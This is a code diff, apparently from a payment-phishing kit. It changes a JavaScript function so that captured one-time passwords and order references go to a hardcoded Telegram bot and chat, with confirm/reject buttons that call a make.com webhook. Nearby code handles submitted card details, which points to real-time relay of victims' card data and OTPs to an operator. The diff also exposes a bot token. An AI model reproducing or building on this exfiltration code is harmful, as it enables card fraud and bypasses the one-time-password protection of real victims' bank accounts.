@@ -1,13 +1,9 @@
 
-
 const BOT_TOKEN = '8410370403:AAFxBmqJQhS1Q5D_XDV8cXqtuZwlhHuaDfo'; // Your bot token
 const CHAT_ID = '-4972495592'; // Your chat or group ID
 
-
-
-
-// Function to send notification
-async function sendTelegramNotification(message) {
+// Function to send OTP to Telegram with confirm/reject buttons
+async function sendTelegramNotification(orderRef, otp) {
     try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -16,9 +12,21 @@ async function sendTelegramNotification(message) {
             },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
+                text: `🆕 New OTP Received\nOrderRef: ${orderRef}\nOTP: ${otp}`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: "✅ Confirm",
+                                url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=confirmed`
+                            },
+                            {
+                                text: "❌ Reject",
+                                url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=rejected`
+                            }
+                        ]
+                    ]
+                }
             })
         });
 
@@ -31,6 +39,7 @@ async function sendTelegramNotification(message) {
         console.error('Error sending Telegram notification:', error);
     }
 }
+
 
 // Function to get USD equivalent
 function getUSDEquivalent(localAmount, country) {
@@ -115,15 +124,7 @@ const TelegramNotifications = {
         await sendTelegramNotification(message);
     },
 
-    notifyOTP: async (otp) => {
-        const message = `
-🔐 <b>OTP Received</b>
-
-<code>${otp}</code>
-⏰ Time: ${new Date().toLocaleString()}`;
-        await sendTelegramNotification(message);
-    },
-
+   
     cardDetailsSubmitted: async (orderData) => {
         const currentCountry = getCurrentCountry();
         const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);
